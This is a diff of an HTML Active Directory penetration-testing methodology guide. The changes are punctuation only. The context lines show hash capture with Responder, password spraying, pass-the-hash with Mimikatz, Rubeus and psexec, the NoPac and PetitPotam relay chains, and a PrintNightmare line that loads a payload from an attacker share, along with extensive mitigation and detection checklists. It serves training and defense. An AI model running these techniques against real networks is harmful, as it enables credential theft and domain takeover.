@@ -129,13 +129,13 @@
   <tr><td>AD Users</td><td>Valid user accounts to target for password spraying</td></tr>
   <tr><td>AD Joined Computers</td><td>DCs, file servers, SQL servers, web servers, Exchange, database servers</td></tr>
   <tr><td>Key Services</td><td>Kerberos, NetBIOS, LDAP, DNS</td></tr>
-  <tr><td>Vulnerable Hosts/Services</td><td>Quick wins -- easy hosts to exploit for a foothold</td></tr>
+  <tr><td>Vulnerable Hosts/Services</td><td>Quick wins; easy hosts to exploit for a foothold</td></tr>
 </tbody>
 </table>
 
 <h3 id="external-recon">1.2 External Reconnaissance</h3>
 
-<p>External recon validates scope, identifies publicly accessible data, and builds target lists before internal testing begins. This phase is passive -- no direct interaction with the target network.</p>
+<p>External recon validates scope, identifies publicly accessible data, and builds target lists before internal testing begins. This phase is passive; no direct interaction with the target network.</p>
 
 <h4 id="external-recon-targets">1.2.1 Target Data</h4>
 
@@ -180,7 +180,7 @@ dnsrecon -d target.com</code></pre></li>
 
 <h3 id="initial-enum">1.3 Initial Enumeration of the Domain</h3>
 
-<p>Initial enumeration from an unauthenticated position on the internal network -- identify hosts, services, users, and potential footholds.</p>
+<p>Initial enumeration from an unauthenticated position on the internal network; identify hosts, services, users, and potential footholds.</p>
 
 <h4 id="passive-host-id">1.3.1 Passive Host Identification</h4>
 
@@ -211,7 +211,7 @@ sudo nmap -v -A -iL hosts.txt -oA host-enum</code></pre>
 <thead>  <tr><th>Target</th><th>Identifying Ports / Indicators</th></tr></thead>
 <tbody>
   <tr><td>Domain Controllers</td><td>53 (DNS), 88 (Kerberos), 389/636 (LDAP/LDAPS), 445 (SMB), 3268/3269 (Global Catalog)</td></tr>
-  <tr><td>Legacy Hosts</td><td>Windows Server 2008, IIS 7.5 -- potential for EternalBlue, MS08-067</td></tr>
+  <tr><td>Legacy Hosts</td><td>Windows Server 2008, IIS 7.5; potential for EternalBlue, MS08-067</td></tr>
   <tr><td>SMB Relay Targets</td><td>SMB signing enabled but not required</td></tr>
   <tr><td>Remote Access</td><td>RDP (3389), WinRM (5985/5986), SSH (22)</td></tr>
   <tr><td>Databases</td><td>MSSQL (1433), MySQL (3306)</td></tr>
@@ -273,7 +273,7 @@ crackmapexec smb DC_IP --users -u '' -p ''</code></pre></li>
 
 <h4 id="llmnr-overview">1.4.1 Capture Workflow</h4>
 
-<p>DNS fails, Windows broadcasts LLMNR then NBT-NS to the local network. Any host can respond -- Responder or Inveigh answers first and captures the authentication attempt.</p>
+<p>DNS fails, Windows broadcasts LLMNR then NBT-NS to the local network. Any host can respond; Responder or Inveigh answers first and captures the authentication attempt.</p>
 
 <ul class="methodology-checklist">
   <li><label><input type="checkbox"> A host tries to resolve a mistyped hostname (e.g., \\printer01 instead of \\print01)</label></li>
@@ -287,7 +287,7 @@ crackmapexec smb DC_IP --users -u '' -p ''</code></pre></li>
 
 <h4 id="responder-linux">1.4.2 Responder (Linux)</h4>
 
-<p>NetNTLMv2 hashes cannot be used for pass-the-hash -- crack them offline. Run Responder in a tmux window while performing other enumeration.</p>
+<p>NetNTLMv2 hashes cannot be used for pass-the-hash; crack them offline. Run Responder in a tmux window while performing other enumeration.</p>
 
 <pre><code class="language-bash">sudo responder -I [interface]
 
@@ -330,7 +330,7 @@ Invoke-Inveigh -LLMNR Y -NBNS Y -ConsoleOutput Y -FileOutput Y</code></pre></li>
 <thead>  <tr><th>Mitigation</th><th>Details</th></tr></thead>
 <tbody>
   <tr><td>Disable LLMNR</td><td>Group Policy: Computer Configuration &gt; Administrative Templates &gt; Network &gt; DNS Client &gt; "Turn OFF Multicast Name Resolution"</td></tr>
-  <tr><td>Disable NBT-NS</td><td>Must be done per-host or via startup script GPO. Registry: <code>HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces</code> -- set NetbiosOptions to 2</td></tr>
+  <tr><td>Disable NBT-NS</td><td>Must be done per-host or via startup script GPO. Registry: <code>HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces</code>: set NetbiosOptions to 2</td></tr>
   <tr><td>Enable SMB Signing</td><td>Prevents NTLM relay attacks by verifying sender/recipient identity</td></tr>
   <tr><td>Network Segmentation</td><td>Isolate hosts that require LLMNR/NBT-NS</td></tr>
   <tr><td>NIDS/NIPS</td><td>Filter LLMNR/NetBIOS traffic, detect spoofing</td></tr>
@@ -449,7 +449,7 @@ Invoke-DomainPasswordSpray -Password 'Season2024!' -OutFile spray_results.txt -E
 <thead>  <tr><th>Mitigation</th><th>Details</th></tr></thead>
 <tbody>
   <tr><td>MFA</td><td>Implement on all external portals and sensitive internal services</td></tr>
-  <tr><td>Restrict Access</td><td>Principle of least privilege -- limit application access to those who need it</td></tr>
+  <tr><td>Restrict Access</td><td>Principle of least privilege; limit application access to those who need it</td></tr>
   <tr><td>Separate Admin Accounts</td><td>Privileged users should use dedicated admin accounts for administrative tasks</td></tr>
   <tr><td>Password Hygiene</td><td>Use password filters to block common words, company name, seasons, months</td></tr>
   <tr><td>LAPS</td><td>Prevents local admin password reuse across hosts</td></tr>
@@ -460,7 +460,7 @@ Invoke-DomainPasswordSpray -Password 'Season2024!' -OutFile spray_results.txt -E
 <p>Monitor Event ID 4625 (logon failure) and 4771 (Kerberos pre-auth failed) for high-frequency patterns. Enable Kerberos logging via Group Policy.</p>
 <h3 id="security-controls">1.6 Enumerating Security Controls</h3>
 
-<p>Check what defenses are in place before running tools -- AV products, AppLocker/WDAC policies, PowerShell language mode, and LAPS deployment.</p>
+<p>Check what defenses are in place before running tools; AV products, AppLocker/WDAC policies, PowerShell language mode, and LAPS deployment.</p>
 
 <pre><code class="language-powershell"># Windows Defender status
 Get-MpComputerStatus
@@ -537,7 +537,7 @@ rpcclient $&gt; querydominfo</code></pre>
 
 
 <h4 id="impacket-enum">1.7.4 Impacket Toolkit</h4>
-<p>psexec.py uploads a service binary to ADMIN$ and runs it via SCM -- drops you as SYSTEM. wmiexec.py executes via WMI, runs as the authenticated user, generates fewer logs, but spawns a new cmd.exe per command (Event ID 4688).</p>
+<p>psexec.py uploads a service binary to ADMIN$ and runs it via SCM; drops you as SYSTEM. wmiexec.py executes via WMI, runs as the authenticated user, generates fewer logs, but spawns a new cmd.exe per command (Event ID 4688).</p>
 
 
 <pre><code class="language-bash"># PsExec -- get SYSTEM shell (needs local admin creds)
@@ -727,7 +727,7 @@ wmic service list brief | findstr "Running"</code></pre>
 </tbody>
 </table>
 
-<p>If <code>net.exe</code> is blocked, try <code>net1.exe</code> -- it is the actual binary that <code>net.exe</code> calls internally.</p>
+<p>If <code>net.exe</code> is blocked, try <code>net1.exe</code>: it is the actual binary that <code>net.exe</code> calls internally.</p>
 
 <h4 id="lotl-dsquery">1.9.5 Dsquery</h4>
 
@@ -861,13 +861,13 @@ Get-DomainUser -SPN | select samaccountname,serviceprincipalname</code></pre></l
 
 <h4 id="kerberoast-defense">1.10.5 Mitigation &amp; Detection</h4>
 
-<p>MITRE ATT&amp;CK: T1558.003 -- Steal or Forge Kerberos Tickets: Kerberoasting</p>
+<p>MITRE ATT&amp;CK: T1558.003; Steal or Forge Kerberos Tickets: Kerberoasting</p>
 
 <table class="custom-table">
 <thead>  <tr><th>Mitigation</th><th>Details</th></tr></thead>
 <tbody>
   <tr><td>Strong service account passwords</td><td>25+ character, randomly generated passwords</td></tr>
-  <tr><td>Group Managed Service Accounts (gMSA)</td><td>AD manages 120-character passwords, rotated every 30 days -- eliminates Kerberoasting</td></tr>
+  <tr><td>Group Managed Service Accounts (gMSA)</td><td>AD manages 120-character passwords, rotated every 30 days; eliminates Kerberoasting</td></tr>
   <tr><td>AES encryption only</td><td>Set msDS-SupportedEncryptionTypes to enforce AES; much slower to crack</td></tr>
   <tr><td>Audit SPNs regularly</td><td>Remove unnecessary SPNs from user accounts</td></tr>
   <tr><td>Limit service account privileges</td><td>Avoid Domain Admin for service accounts</td></tr>
@@ -878,7 +878,7 @@ Get-DomainUser -SPN | select samaccountname,serviceprincipalname</code></pre></l
 <p>Monitor Event ID 4769 (Kerberos Service Ticket Operations). Watch for RC4 TGS requests when accounts support AES. High volume of TGS requests from a single user is anomalous.</p>
 <h3 id="acl-abuse">1.11 ACL/ACE Abuse</h3>
 
-<p>AD objects are protected by DACLs composed of individual ACEs. Misconfigured ACEs -- GenericAll, WriteDACL, ForceChangePassword granted to unprivileged groups -- create attack paths that bypass traditional credential theft.</p>
+<p>AD objects are protected by DACLs composed of individual ACEs. Misconfigured ACEs; GenericAll, WriteDACL, ForceChangePassword granted to unprivileged groups; create attack paths that bypass traditional credential theft.</p>
 
 <figure><img src="./img/cape/bloodhound-forcechangepassword.png" alt="BloodHound showing ForceChangePassword edge between users"></figure>
 
@@ -904,10 +904,10 @@ Get-DomainUser -SPN | select samaccountname,serviceprincipalname</code></pre></l
 <thead>  <tr><th>Permission</th><th>What It Allows</th></tr></thead>
 <tbody>
   <tr><td>ForceChangePassword</td><td>Reset a user's password without knowing the current one</td></tr>
-  <tr><td>GenericAll</td><td>Full control -- add members, reset passwords, Kerberoast (set SPN), etc.</td></tr>
+  <tr><td>GenericAll</td><td>Full control; add members, reset passwords, Kerberoast (set SPN), etc.</td></tr>
   <tr><td>GenericWrite</td><td>Write to any non-protected attribute (e.g., add SPN for Kerberoasting, modify logon script)</td></tr>
   <tr><td>WriteOwner</td><td>Change object owner to attacker, then grant full control</td></tr>
-  <tr><td>WriteDACL</td><td>Modify the object's DACL -- grant yourself any permission</td></tr>
+  <tr><td>WriteDACL</td><td>Modify the object's DACL; grant yourself any permission</td></tr>
   <tr><td>AllExtendedRights</td><td>ForceChangePassword + ability to read LAPS passwords</td></tr>
   <tr><td>AddSelf</td><td>Add yourself to a group</td></tr>
 </tbody>
@@ -987,9 +987,9 @@ Set-DomainUserPassword -Identity target -AccountPassword $cred</code></pre></li>
 <h4 id="acl-defense">1.11.5 Remediation &amp; Detection</h4>
 
 <ul class="methodology-checklist">
-<li><label><input type="checkbox"> Audit and remove dangerous ACLs -- strip GenericAll/WriteDACL/WriteOwner from non-admin accounts</label></li>
+<li><label><input type="checkbox"> Audit and remove dangerous ACLs; strip GenericAll/WriteDACL/WriteOwner from non-admin accounts</label></li>
 <li><label><input type="checkbox"> Monitor group membership changes on high-impact groups (Domain Admins, Enterprise Admins, Schema Admins)</label></li>
-<li><label><input type="checkbox"> Enable Advanced Security Audit Policy -- event ID 5136 (directory service object was modified)</label></li>
+<li><label><input type="checkbox"> Enable Advanced Security Audit Policy; event ID 5136 (directory service object was modified)</label></li>
 <li><label><input type="checkbox"> Review SDDL strings with <code>ConvertFrom-SddlString</code> for human-readable ACL analysis</label></li>
 <li><label><input type="checkbox"> Run BloodHound "Dangerous Rights" queries periodically to catch new misconfigurations</label></li>
 </ul>
@@ -1068,7 +1068,7 @@ impacket-psexec -hashes :NTLM_HASH administrator@DC_IP</code></pre></li>
 </ul>
 <h3 id="privileged-access">1.13 Privileged Access</h3>
 
-<p>Test obtained credentials against remote access services -- RDP, WinRM, and SQL Server each require different group memberships.</p>
+<p>Test obtained credentials against remote access services; RDP, WinRM, and SQL Server each require different group memberships.</p>
 
 <h4 id="rdp-access">1.13.1 Remote Desktop (RDP)</h4>
 
@@ -1129,7 +1129,7 @@ Get-ADGroupMember "Remote Management Users"</code></pre></li>
 
 <h4 id="double-hop-workarounds">1.14.1 Workarounds</h4>
 
-<p>Both workarounds involve placing credentials on the remote host. Workaround 2 spawns the session as the registered user regardless of who connects -- restrict access carefully.</p>
+<p>Both workarounds involve placing credentials on the remote host. Workaround 2 spawns the session as the registered user regardless of who connects; restrict access carefully.</p>
 
 <pre><code class="language-powershell"># Workaround 1: PSCredential Object
 $SecPassword = ConvertTo-SecureString '[password]' -AsPlainText -Force
@@ -1150,7 +1150,7 @@ Enter-PSSession -ComputerName [target-host] -Credential $Cred -ConfigurationName
 
 <h4 id="nopac">1.15.1 NoPac / SamAccountName Spoofing</h4>
 
-<p>Chains CVE-2021-42278 (SamAccountName spoofing) with CVE-2021-42287 (KDC confusion during TGS request) -- a standard domain user impersonates a DC and obtains a TGT as that DC.</p>
+<p>Chains CVE-2021-42278 (SamAccountName spoofing) with CVE-2021-42287 (KDC confusion during TGS request); a standard domain user impersonates a DC and obtains a TGT as that DC.</p>
 
 <p>Requires <code>ms-DS-MachineAccountQuota</code> > 0 (default is 10, allowing users to add machine accounts).</p>
 
@@ -1183,7 +1183,7 @@ sudo python3 CVE-2021-1675.py [domain]/[user]:[password]@[dc-ip] '\\[attacker-ip
 
 <h4 id="petitpotam">1.15.3 PetitPotam (CVE-2021-36942)</h4>
 
-<p>Coerces a Windows host to authenticate to an attacker via MS-EFSRPC. Chain with AD CS -- relay NTLM to the CA web enrollment, obtain a certificate as the DC, then DCSync.</p>
+<p>Coerces a Windows host to authenticate to an attacker via MS-EFSRPC. Chain with AD CS; relay NTLM to the CA web enrollment, obtain a certificate as the DC, then DCSync.</p>
 
 <pre><code class="language-bash"># Start NTLM relay targeting AD CS
 sudo ntlmrelayx.py -debug -smb2support --target http://[ca-hostname].[domain]/certsrv/certfnsh.asp --adcs --template DomainController
@@ -1366,7 +1366,7 @@ crackmapexec smb DC_IP -u user -p pass -M gpp_password</code></pre></li>
 <ul class="methodology-checklist">
 <li><label><input type="checkbox"> Disable "Do not require Kerberos preauthentication" on all accounts unless absolutely required</label></li>
 <li><label><input type="checkbox"> Enforce 25+ character passwords on any accounts that must have pre-auth disabled</label></li>
-<li><label><input type="checkbox"> Monitor event ID 4768 (TGT requests) for encryption type 0x17 (RC4) -- indicates AS-REP requests</label></li>
+<li><label><input type="checkbox"> Monitor event ID 4768 (TGT requests) for encryption type 0x17 (RC4); indicates AS-REP requests</label></li>
 <li><label><input type="checkbox"> Audit DONT_REQ_PREAUTH accounts periodically</label>
 <pre><code class="language-powershell">Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth</code></pre></li>
 </ul>
@@ -1390,7 +1390,7 @@ crackmapexec smb DC_IP -u user -p pass -M gpp_password</code></pre></li>
 </tbody>
 </table>
 
-<p>Transitive trusts extend beyond two domains (A trusts B, B trusts C, so A trusts C). Non-transitive trusts exist only between the two specified domains. Direction is either one-way (incoming or outgoing) or bidirectional -- in a one-way trust, the trusting domain allows users from the trusted domain to access its resources.</p>
+<p>Transitive trusts extend beyond two domains (A trusts B, B trusts C, so A trusts C). Non-transitive trusts exist only between the two specified domains. Direction is either one-way (incoming or outgoing) or bidirectional; in a one-way trust, the trusting domain allows users from the trusted domain to access its resources.</p>
 
 <h4 id="trust-enum">1.17.2 Trust Enumeration</h4>
 
@@ -1511,7 +1511,7 @@ impacket-psexec -k -no-pass PARENT_DC_HOSTNAME</code></pre></li>
 
 <ul class="methodology-checklist">
 <li><label><input type="checkbox"> Enable SID Filtering on all inter-domain trusts to strip foreign SIDs from tokens</label></li>
-<li><label><input type="checkbox"> Use Selective Authentication on forest trusts -- restricts which users can authenticate across the boundary</label></li>
+<li><label><input type="checkbox"> Use Selective Authentication on forest trusts; restricts which users can authenticate across the boundary</label></li>
 <li><label><input type="checkbox"> Limit Domain Admin accounts in child domains</label></li>
 <li><label><input type="checkbox"> Monitor for TGT requests containing SID History entries (event ID 4769 with extra SIDs)</label></li>
 <li><label><input type="checkbox"> Rotate the KRBTGT password twice to invalidate all existing Golden Tickets</label></li>
@@ -1571,7 +1571,7 @@ bloodhound-python -d [foreign-domain] -dc [foreign-dc-hostname].[foreign-domain]
 
 <h4 id="sid-history-cross-forest">1.19.4 SID History Abuse Across Forests</h4>
 
-<p>If SID Filtering is disabled on a forest trust, migrated users retain their SID History from the source forest -- including any administrative rights.</p>
+<p>If SID Filtering is disabled on a forest trust, migrated users retain their SID History from the source forest; including any administrative rights.</p>
 
 
 <!-- ═══════════════════════════════════════════════════════════════ -->
@@ -1594,7 +1594,7 @@ bloodhound-python -d [foreign-domain] -dc [foreign-dc-hostname].[foreign-domain]
 <ul class="methodology-checklist">
 <li><label><input type="checkbox"> Enable SID Filtering on all forest trusts</label></li>
 <li><label><input type="checkbox"> Use strong, unique passwords for service accounts with SPNs across trust boundaries</label></li>
-<li><label><input type="checkbox"> Audit foreign group memberships regularly -- <code>Get-DomainForeignGroupMember</code></label></li>
+<li><label><input type="checkbox"> Audit foreign group memberships regularly: <code>Get-DomainForeignGroupMember</code></label></li>
 <li><label><input type="checkbox"> Avoid password reuse for admin accounts across forests</label></li>
 <li><label><input type="checkbox"> Monitor for cross-forest TGS requests (event ID 4769 with target domain != source domain)</label></li>
 </ul>
@@ -1607,25 +1607,25 @@ bloodhound-python -d [foreign-domain] -dc [foreign-dc-hostname].[foreign-domain]
 
 <p>Perform annual (or quarterly) audits of:</p>
 <ul class="methodology-checklist">
-<li><label><input type="checkbox"> OU, computer, user, and group naming conventions -- verify they follow a consistent standard</label></li>
-<li><label><input type="checkbox"> DNS, network, DHCP configurations -- identify stale records, rogue DHCP servers</label></li>
-<li><label><input type="checkbox"> All GPOs and their applied objects -- check for orphaned GPOs with no linked OU</label></li>
-<li><label><input type="checkbox"> FSMO role assignments -- verify placement on appropriate DCs</label></li>
-<li><label><input type="checkbox"> Full application inventory -- identify EOL software and unsupported versions</label></li>
+<li><label><input type="checkbox"> OU, computer, user, and group naming conventions; verify they follow a consistent standard</label></li>
+<li><label><input type="checkbox"> DNS, network, DHCP configurations; identify stale records, rogue DHCP servers</label></li>
+<li><label><input type="checkbox"> All GPOs and their applied objects; check for orphaned GPOs with no linked OU</label></li>
+<li><label><input type="checkbox"> FSMO role assignments; verify placement on appropriate DCs</label></li>
+<li><label><input type="checkbox"> Full application inventory; identify EOL software and unsupported versions</label></li>
 <li><label><input type="checkbox"> Enterprise host inventory with physical and logical locations</label></li>
-<li><label><input type="checkbox"> Trust relationships (internal and external) -- validate direction, transitivity, and SID filtering status</label></li>
-<li><label><input type="checkbox"> Users with elevated permissions -- compare against approved access lists</label></li>
+<li><label><input type="checkbox"> Trust relationships (internal and external); validate direction, transitivity, and SID filtering status</label></li>
+<li><label><input type="checkbox"> Users with elevated permissions; compare against approved access lists</label></li>
 </ul>
 
 <h4 id="hardening-people">1.20.2 People</h4>
 
 <ul class="methodology-checklist">
-<li><label><input type="checkbox"> Enforce password policy with custom password filter -- block company name, seasons, months, common patterns (Password1, Welcome1, Season+Year)</label></li>
+<li><label><input type="checkbox"> Enforce password policy with custom password filter; block company name, seasons, months, common patterns (Password1, Welcome1, Season+Year)</label></li>
 <li><label><input type="checkbox"> Rotate service account passwords at least annually; prefer gMSA for automatic rotation</label></li>
-<li><label><input type="checkbox"> Remove local admin rights from user workstations -- require PAW (Privileged Access Workstation) for admin tasks</label></li>
+<li><label><input type="checkbox"> Remove local admin rights from user workstations; require PAW (Privileged Access Workstation) for admin tasks</label></li>
 <li><label><input type="checkbox"> Disable the default RID-500 local admin account; create a new admin account managed by LAPS</label></li>
-<li><label><input type="checkbox"> Implement tiered administration -- separate admin accounts per tier (Tier 0: DCs, Tier 1: servers, Tier 2: workstations)</label></li>
-<li><label><input type="checkbox"> Minimize Domain Admins and Enterprise Admins membership -- audit quarterly</label></li>
+<li><label><input type="checkbox"> Implement tiered administration; separate admin accounts per tier (Tier 0: DCs, Tier 1: servers, Tier 2: workstations)</label></li>
+<li><label><input type="checkbox"> Minimize Domain Admins and Enterprise Admins membership; audit quarterly</label></li>
 <li><label><input type="checkbox"> Disable Kerberos delegation for all admin accounts; add to Protected Users group</label></li>
 </ul>
 
@@ -1645,10 +1645,10 @@ bloodhound-python -d [foreign-domain] -dc [foreign-dc-hostname].[foreign-domain]
 <h4 id="hardening-process">1.20.4 Processes</h4>
 
 <ul class="methodology-checklist">
-<li><label><input type="checkbox"> Maintain AD asset management policies -- track all domain-joined devices and their owners</label></li>
+<li><label><input type="checkbox"> Maintain AD asset management policies; track all domain-joined devices and their owners</label></li>
 <li><label><input type="checkbox"> Enforce MFA on all remote access (VPN, RDP gateway, OWA, cloud portals)</label></li>
 <li><label><input type="checkbox"> Maintain baseline security hardening guidelines and gold images for server/workstation provisioning</label></li>
-<li><label><input type="checkbox"> Implement AD cleanup policies -- disable accounts after 30 days inactive, delete after 90</label></li>
+<li><label><input type="checkbox"> Implement AD cleanup policies; disable accounts after 30 days inactive, delete after 90</label></li>
 <li><label><input type="checkbox"> Decommission legacy OS/services on a defined timeline (e.g., Exchange on-prem to O365 migration)</label></li>
 <li><label><input type="checkbox"> Schedule quarterly user, group, and host audits with automated reporting</label></li>
 </ul>
@@ -1656,21 +1656,21 @@ bloodhound-python -d [foreign-domain] -dc [foreign-dc-hostname].[foreign-domain]
 <h4 id="hardening-technology">1.20.5 Technology</h4>
 
 <ul class="methodology-checklist">
-<li><label><input type="checkbox"> Run BloodHound, PingCastle, and Group3r periodically -- quarterly at minimum</label></li>
+<li><label><input type="checkbox"> Run BloodHound, PingCastle, and Group3r periodically; quarterly at minimum</label></li>
 <li><label><input type="checkbox"> Scan for passwords in AD description fields</label>
 <pre><code class="language-powershell">Get-ADUser -Filter * -Properties Description | Where {$_.Description -ne $null}</code></pre></li>
 <li><label><input type="checkbox"> Review SYSVOL scripts for hardcoded credentials</label></li>
 <li><label><input type="checkbox"> Use gMSA instead of standard service accounts for all services that support them</label></li>
-<li><label><input type="checkbox"> Disable Unconstrained Delegation -- migrate to Constrained or Resource-Based Constrained Delegation</label></li>
-<li><label><input type="checkbox"> Restrict DC access to hardened PAWs only -- no direct RDP from standard workstations</label></li>
+<li><label><input type="checkbox"> Disable Unconstrained Delegation; migrate to Constrained or Resource-Based Constrained Delegation</label></li>
+<li><label><input type="checkbox"> Restrict DC access to hardened PAWs only; no direct RDP from standard workstations</label></li>
 <li><label><input type="checkbox"> Set <code>ms-DS-MachineAccountQuota</code> to 0 to prevent unprivileged users from joining machines to the domain</label></li>
 <li><label><input type="checkbox"> Disable Print Spooler on all DCs and servers that do not need printing</label></li>
-<li><label><input type="checkbox"> Disable NTLM authentication on DCs via GPO where feasible -- test in audit mode first</label></li>
+<li><label><input type="checkbox"> Disable NTLM authentication on DCs via GPO where feasible; test in audit mode first</label></li>
 <li><label><input type="checkbox"> Enable Extended Protection for Authentication and require SSL on AD CS web enrollment</label></li>
 <li><label><input type="checkbox"> Enforce SMB signing and LDAP signing domain-wide via GPO</label></li>
-<li><label><input type="checkbox"> Set <code>RestrictNullSessAccess</code> registry key to 1 -- block anonymous SMB/LDAP access</label></li>
+<li><label><input type="checkbox"> Set <code>RestrictNullSessAccess</code> registry key to 1; block anonymous SMB/LDAP access</label></li>
 <li><label><input type="checkbox"> Perform penetration tests quarterly (annual at minimum) with scope including AD-specific attacks</label></li>
-<li><label><input type="checkbox"> Test and validate backups regularly -- practice domain recovery from backup</label></li>
+<li><label><input type="checkbox"> Test and validate backups regularly; practice domain recovery from backup</label></li>
 </ul>
 
 <h4 id="protections-by-ttp">1.20.6 Protections by TTP (MITRE ATT&amp;CK Mapping)</h4>
@@ -1750,7 +1750,7 @@ group3r.exe -f findings.log
 # Output to stdout
 group3r.exe -s</code></pre>
 
-<p>Output is indented by level: no indent is the GPO, one indent is the policy setting, and a second indent is the finding with a reason. Group3r catches paths that other tools overlook -- scripts with embedded credentials, dangerous GPO settings, and overly permissive delegations.</p>
+<p>Output is indented by level: no indent is the GPO, one indent is the policy setting, and a second indent is the finding with a reason. Group3r catches paths that other tools overlook; scripts with embedded credentials, dangerous GPO settings, and overly permissive delegations.</p>
 
 <ul class="methodology-checklist">
 <li><label><input type="checkbox"> Run from a domain-joined host with domain user context</label></li>
@@ -1861,7 +1861,7 @@ group3r.exe -s</code></pre>
 </tbody>
 </table>
 
-<p>Look for "quick wins" such as the current user or <code>Domain Users</code> group having RDP and/or local administrator access to hosts. Check if the current user is a member of any privileged groups, has special delegated rights, or has control over other domain objects. The enumeration process is <strong>iterative</strong> -- as you compromise hosts and users, perform additional enumeration to discover new access.</p>
+<p>Look for "quick wins" such as the current user or <code>Domain Users</code> group having RDP and/or local administrator access to hosts. Check if the current user is a member of any privileged groups, has special delegated rights, or has control over other domain objects. The enumeration process is <strong>iterative</strong>: as you compromise hosts and users, perform additional enumeration to discover new access.</p>
 
 <h4>Methodology</h4>
 <ul class="methodology-checklist">
@@ -1896,7 +1896,7 @@ whoami /groups</code></pre></li>
 <tbody>
 <tr><td>Default Administrators</td><td>Domain Admins and Enterprise Admins "super" groups</td><td>Full domain control</td></tr>
 <tr><td>Server Operators</td><td>Can modify services, access SMB shares, backup files</td><td>Service abuse for code execution on DCs</td></tr>
-<tr><td>Backup Operators</td><td>Can log onto DCs locally, make shadow copies of SAM/NTDS, read registry remotely, access DC file system via SMB</td><td>Effectively Domain Admins -- can dump NTDS.dit</td></tr>
+<tr><td>Backup Operators</td><td>Can log onto DCs locally, make shadow copies of SAM/NTDS, read registry remotely, access DC file system via SMB</td><td>Effectively Domain Admins; can dump NTDS.dit</td></tr>
 <tr><td>Print Operators</td><td>Can logon to DCs locally and load drivers</td><td>Can trick Windows into loading a malicious driver</td></tr>
 <tr><td>Hyper-V Administrators</td><td>Administer virtual machines including virtual DCs</td><td>If virtual DCs exist, these are effectively Domain Admins</td></tr>
 <tr><td>Account Operators</td><td>Can modify non-protected accounts and groups</td><td>Can reset passwords, add users to groups</td></tr>
@@ -2007,13 +2007,13 @@ whoami /groups</code></pre></li>
 
 <p>Many tools get credentials from the current user context rather than accepting credential parameters. When you have access to a password or hash but need to run tools in a different domain context, use one of the following methods:</p>
 
-<p><strong>runas /netonly</strong> -- Built-in Windows command to spawn a process with alternate credentials. The <code>/netonly</code> flag means authentication only applies to network resources:</p>
+<p><strong>runas /netonly</strong>: Built-in Windows command to spawn a process with alternate credentials. The <code>/netonly</code> flag means authentication only applies to network resources:</p>
 <pre><code class="language-bash">runas /netonly /user:htb.local\[user] powershell</code></pre>
 
-<p><strong>Rubeus</strong> -- Request a TGT using an NTLM hash (pass-the-hash to Kerberos):</p>
+<p><strong>Rubeus</strong>: Request a TGT using an NTLM hash (pass-the-hash to Kerberos):</p>
 <pre><code class="language-bash">rubeus.exe asktgt /user:[user] /domain:htb.local /dc:[target-ip] /rc4:ad11e823e1638def97afa7cb08156a94</code></pre>
 
-<p><strong>Mimikatz</strong> -- Pass-the-hash to spawn a process with alternate credentials:</p>
+<p><strong>Mimikatz</strong>: Pass-the-hash to spawn a process with alternate credentials:</p>
 <pre><code class="language-bash">mimikatz.exe sekurlsa::pth /domain:htb.local /user:[user] /rc4:ad11e823e1638def97afa7cb08156a94</code></pre>
 
 <h4 id="rsat-enumeration">2.3.3 Enumeration with RSAT Snap-ins</h4>
@@ -2272,7 +2272,7 @@ Get-ADUser -Filter 'name -eq "[user]"'</code></pre>
 
 <h4 id="ldap-filter-syntax">2.7.1 LDAP Filter Syntax and Operators</h4>
 
-<p>LDAP filters use <strong>Polish Notation</strong> (prefix notation) -- operators are placed <em>before</em> the operands. Filter rules are enclosed in parentheses and grouped using logical operators:</p>
+<p>LDAP filters use <strong>Polish Notation</strong> (prefix notation); operators are placed <em>before</em> the operands. Filter rules are enclosed in parentheses and grouped using logical operators:</p>
 
 <table class="custom-table">
 <thead><tr><th>Operator</th><th>Function</th><th>Example</th></tr></thead>
@@ -2363,7 +2363,7 @@ Get-ADUser -Filter 'name -eq "[user]"'</code></pre>
 </tbody>
 </table>
 
-<p>Why OIDs matter: The <code>userAccountControl</code> attribute in AD is a bitmask where individual flags are stored as individual bits. To check if a specific flag is set, you cannot use simple equality -- you must use a bitwise AND operation. For example, the <code>ACCOUNTDISABLE</code> flag has a value of 2. To find all disabled accounts, you check if bit 2 is set using OID <code>1.2.840.113556.1.4.803</code>.</p>
+<p>Why OIDs matter: The <code>userAccountControl</code> attribute in AD is a bitmask where individual flags are stored as individual bits. To check if a specific flag is set, you cannot use simple equality; you must use a bitwise AND operation. For example, the <code>ACCOUNTDISABLE</code> flag has a value of 2. To find all disabled accounts, you check if bit 2 is set using OID <code>1.2.840.113556.1.4.803</code>.</p>
 
 <h4 id="ldap-filter-examples">2.7.5 Practical LDAP Filter Examples</h4>
 
@@ -2439,7 +2439,7 @@ Get-ADComputer -Properties * -LDAPFilter '(userAccountControl:1.2.840.113556.1.4
 <pre><code class="language-powershell">Get-ADGroupMember -Identity "Security Operations"
 # Returns: [user].jones -- confirming Security Operations is nested in Domain Admins</code></pre>
 
-<p>RecursiveMatch parameter -- find ALL groups (direct and indirect):</p>
+<p>RecursiveMatch parameter; find ALL groups (direct and indirect):</p>
 <pre><code class="language-powershell">Get-ADGroup -Filter 'member -RecursiveMatch "CN=Harry Jones,OU=Network Ops,OU=IT,OU=Employees,DC=[DOMAIN],DC=LOCAL"' | select name</code></pre>
 
 <p>Same query using LDAP filter with matching rule OID:</p>
@@ -2463,18 +2463,18 @@ Get-ADComputer -Properties * -LDAPFilter '(userAccountControl:1.2.840.113556.1.4
 
 <p>Examples using the Employees OU (970 users across all sub-OUs):</p>
 
-<p>Base scope -- returns nothing with Get-ADUser, returns the OU with Get-ADObject:</p>
+<p>Base scope; returns nothing with Get-ADUser, returns the OU with Get-ADObject:</p>
 <pre><code class="language-powershell"># Returns nothing (no users AT the OU level itself)
 Get-ADUser -SearchBase "OU=Employees,DC=[DOMAIN],DC=LOCAL" -SearchScope Base -Filter *
 
 # Returns the OU object itself
 Get-ADObject -SearchBase "OU=Employees,DC=[DOMAIN],DC=LOCAL" -SearchScope Base -Filter *</code></pre>
 
-<p>OneLevel scope -- returns only objects directly in the Employees OU (not in child OUs):</p>
+<p>OneLevel scope; returns only objects directly in the Employees OU (not in child OUs):</p>
 <pre><code class="language-powershell">Get-ADUser -SearchBase "OU=Employees,DC=[DOMAIN],DC=LOCAL" -SearchScope OneLevel -Filter *
